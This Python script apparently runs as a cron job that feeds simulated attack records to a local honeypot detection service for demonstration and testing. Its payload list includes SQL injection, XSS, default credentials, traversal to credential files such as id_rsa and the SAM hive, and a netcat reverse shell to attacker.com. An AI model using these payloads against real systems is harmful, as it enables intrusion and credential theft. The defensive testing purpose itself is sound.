#!/usr/bin/env python3
"""
Honeypot Attack Simulation Cron Job
Simulates realistic cyber attacks to trigger honeypot creation and destruction cycles
Designed for Amazon Linux EC2 with minimal dependencies
"""

import json
import time
import random
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timedelta
import sys
import os

# Configuration
DASHBOARD_URL = "https://srms4z2ke7.execute-api.us-east-1.amazonaws.com/prod"
LOG_FILE = "/var/log/honeypot-simulator.log"

class HoneypotAttackSimulator:
    """Simulates attacks against honeypot infrastructure"""
    
    def __init__(self):
        self.active_honeypots = []
        self.total_attacks = 0
        self.total_engagements = 0
        self.intelligence_reports = []
        
        self.attack_patterns = [
            {
                "name": "SQL Injection Campaign",
                "endpoints": ["/admin/login", "/user/profile", "/search"],
                "payloads": [
                    "' OR '1'='1 --",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT * FROM admin --",
                    "1' AND (SELECT COUNT(*) FROM users) > 0 --"
                ],
                "intensity": "high"
            },
            {
                "name": "XSS Attack Wave",
                "endpoints": ["/search", "/comment", "/profile"],
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>"
                ],
                "intensity": "medium"
            },
            {
                "name": "Brute Force Attack",
                "endpoints": ["/admin/login", "/ssh", "/ftp"],
                "payloads": [
                    "admin:password123",
                    "root:toor",
                    "administrator:admin",
                    "user:password"
                ],
                "intensity": "high"
            },
            {
                "name": "Directory Traversal",
                "endpoints": ["/files", "/download", "/view"],
                "payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam",
                    "../../../../var/log/auth.log",
                    "../../../home/user/.ssh/id_rsa"
                ],
                "intensity": "medium"
            },
            {
                "name": "Command Injection",
                "endpoints": ["/ping", "/traceroute", "/nslookup"],
                "payloads": [
                    "; cat /etc/passwd",
                    "| whoami",
                    "&& ls -la /",
                    "; nc -e /bin/sh attacker.com 4444"
                ],
                "intensity": "high"
            }
        ]
        
        self.source_ips = [
            "192.168.1.100", "10.0.0.50", "172.16.0.25", 
            "203.0.113.10", "198.51.100.5", "192.0.2.15"
        ]
        
        # Track active honeypots
        self.active_honeypots = []
    
    def log_message(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        
        try:
            with open(LOG_FILE, "a") as f:
                f.write(log_entry + "\n")
        except Exception as e:
            print(f"Warning: Could not write to log file: {e}")
    
    def simulate_attack_wave(self, duration_minutes=5):
        """Simulate a wave of attacks for specified duration"""
        self.log_message("🚨 Starting attack simulation wave...")
        
        start_time = datetime.now()
        end_time = start_time + timedelta(minutes=duration_minutes)
        attack_count = 0
        
        while datetime.now() < end_time:
            # Select random attack pattern
            attack = random.choice(self.attack_patterns)
            source_ip = random.choice(self.source_ips)
            endpoint = random.choice(attack["endpoints"])
            payload = random.choice(attack["payloads"])
            
            # Simulate attack
            self.log_message(f"🎯 {attack['name']} from {source_ip}")
            self.log_message(f"   Target: {endpoint}")
            self.log_message(f"   Payload: {payload}")
            
            # Simulate detection and response
            confidence = random.uniform(0.75, 0.95)
            self.log_message(f"   🤖 AI Detection: {confidence:.1%} confidence")
            
            if confidence > 0.8:
                self.log_message(f"   🎭 Honeypot deployment: APPROVED")
                # Send attack to AgentCore for real processing
                result = self.send_attack_to_agentcore(attack['name'], source_ip, endpoint, payload)
                if result and result.get('success'):
                    self.log_message(f"   ✅ Attack processed by AgentCore")
                else:
                    self.log_message(f"   ⚠️  AgentCore processing failed, using local simulation")
            else:
                self.log_message(f"   ⚠️  Honeypot deployment: DECLINED (low confidence)")
            
            attack_count += 1
            
            # Variable delay between attacks based on intensity
            if attack["intensity"] == "high":
                time.sleep(random.uniform(2, 8))
            elif attack["intensity"] == "medium":
                time.sleep(random.uniform(5, 15))
            else:
                time.sleep(random.uniform(10, 30))
        
        self.log_message(f"✅ Attack wave completed: {attack_count} attacks simulated")
        return attack_count
    
    def send_attack_to_agentcore(self, attack_type, source_ip, endpoint, payload):
        """Send attack data to AgentCore for processing"""
        try:
            # Prepare attack data for AgentCore
            attack_data = {
                "type": attack_type,
                "source_ip": source_ip,
                "target_endpoint": endpoint,
                "payload": payload,
                "timestamp": datetime.now().isoformat(),
                "severity": self.get_attack_severity(attack_type)
            }
            
            # Send to AgentCore detection endpoint
            agentcore_url = "http://localhost:8000/api/attacks/detect"
            
            data = json.dumps(attack_data).encode('utf-8')
            req = urllib.request.Request(
                agentcore_url,
                data=data,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'HoneypotAttackSimulator/1.0'
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    result = json.loads(response.read().decode())
                    self.log_message(f"   🤖 AgentCore response: {result.get('status', 'processed')}")
                    
                    if result.get('honeypot_created'):
                        self.active_honeypots.append({
                            'id': result.get('honeypot_id'),
                            'type': attack_type,
                            'source_ip': source_ip,
                            'created_at': datetime.now()
                        })
                        self.log_message(f"   🎭 Honeypot created: {result.get('honeypot_id')}")
                    
                    return result
                else:
                    self.log_message(f"   ❌ AgentCore error: HTTP {response.status}")
                    return None
                    
        except urllib.error.URLError as e:
            self.log_message(f"   ⚠️  AgentCore not available: {e}")
            # Fallback to local simulation
            return self.simulate_local_honeypot_lifecycle(attack_type, source_ip)
        except Exception as e:
            self.log_message(f"   ❌ Failed to send attack to AgentCore: {e}")
            return None
    
    def get_attack_severity(self, attack_type):
        """Get attack severity level"""
        severity_map = {
            "SQL Injection Campaign": "HIGH",
            "XSS Attack Wave": "MEDIUM", 
            "Brute Force Attack": "HIGH",
            "Directory Traversal": "MEDIUM",
            "Command Injection": "CRITICAL"
        }
        return severity_map.get(attack_type, "MEDIUM")
    
    def simulate_local_honeypot_lifecycle(self, attack_type, source_ip):
        """Fallback local simulation when AgentCore is not available"""
        self.log_message(f"   🏗️  Local simulation: Creating honeypot for {attack_type}...")
        time.sleep(random.uniform(1, 3))
        self.log_message(f"   ✅ Local honeypot online and ready")
        
        # Engagement phase
        engagement_duration = random.randint(30, 300)
        interactions = random.randint(5, 50)
        
        self.log_message(f"   👤 Attacker {source_ip} engaging...")
        time.sleep(random.uniform(2, 5))
        
        # Simulate interaction progression
        for i in range(min(3, interactions // 10)):
            self.log_message(f"   💬 Interaction {i+1}: Attacker probing system")
            time.sleep(random.uniform(0.5, 2))
        
        self.log_message(f"   📊 Session complete: {engagement_duration}s, {interactions} interactions")
        
        # Intelligence extraction
        self.log_message(f"   🧠 Extracting intelligence...")
        time.sleep(random.uniform(1, 2))
        
        iocs_count = random.randint(2, 8)
        mitre_techniques = random.choice([
            ["T1190", "T1059"],
            ["T1110", "T1021"], 
            ["T1083", "T1005"],
            ["T1046", "T1018"]
        ])
        
        self.log_message(f"   📋 Intelligence extracted: {iocs_count} IOCs, MITRE: {', '.join(mitre_techniques)}")
        
        # Honeypot destruction
        self.log_message(f"   🗑️  Destroying honeypot (session complete)")
        time.sleep(random.uniform(1, 2))
        self.log_message(f"   ✅ Honeypot destroyed, resources cleaned up")
        
        return {"success": True, "mode": "local_simulation"}
    
    def check_dashboard_status(self):
        """Check if dashboard is accessible and return current metrics"""
        try:
            # Check main dashboard
            req = urllib.request.Request(f"{DASHBOARD_URL}/")
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    self.log_message("✅ Dashboard accessible")
                else:
                    self.log_message(f"⚠️  Dashboard returned status: {response.status}")
            
            # Check API endpoints
            endpoints = ["/api/threats", "/api/engagements", "/api/intelligence"]
            for endpoint in endpoints:
                try:
                    req = urllib.request.Request(f"{DASHBOARD_URL}{endpoint}")
                    with urllib.request.urlopen(req, timeout=5) as response:
                        data = json.loads(response.read().decode())
                        self.log_message(f"✅ {endpoint}: {len(data)} items")
                except Exception as e:
                    self.log_message(f"❌ {endpoint}: Error - {e}")
                    
        except Exception as e:
            self.log_message(f"❌ Dashboard check failed: {e}")
    
    def run_simulation_cycle(self):
        """Run a complete simulation cycle"""
        self.log_message("=" * 60)
        self.log_message("🎬 Starting Honeypot Attack Simulation Cycle")
        self.log_message("=" * 60)
        
        # Check dashboard status before simulation
        self.log_message("📊 Checking dashboard status...")
        self.check_dashboard_status()
        
        # Run attack simulation
        attack_count = self.simulate_attack_wave(duration_minutes=3)
        
        # Brief pause for system processing
        self.log_message("⏳ Allowing system to process attacks...")
        time.sleep(10)
        
        # Check dashboard status after simulation
        self.log_message("📊 Checking dashboard status after simulation...")
        self.check_dashboard_status()
        
        self.log_message(f"🎉 Simulation cycle complete: {attack_count} attacks processed")
        self.log_message("=" * 60)

def setup_logging():
    """Setup logging directory if needed"""
    log_dir = os.path.dirname(LOG_FILE)
    if log_dir and not os.path.exists(log_dir):
        try:
            os.makedirs(log_dir, exist_ok=True)
        except Exception as e:
            print(f"Warning: Could not create log directory: {e}")

def main():
    """Main execution function"""
    setup_logging()
    
    simulator = HoneypotAttackSimulator()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "--continuous":
            # Continuous mode for cron job
            while True:
                simulator.run_simulation_cycle()
                # Wait 10-15 minutes between cycles
                sleep_time = random.randint(600, 900)
                simulator.log_message(f"😴 Sleeping for {sleep_time//60} minutes...")
                time.sleep(sleep_time)
        elif sys.argv[1] == "--single":
            # Single cycle mode
            simulator.run_simulation_cycle()
        elif sys.argv[1] == "--check":
            # Just check dashboard status
            simulator.check_dashboard_status()
    else:
        # Default: single cycle
        simulator.run_simulation_cycle()

if __name__ == "__main__":
    main()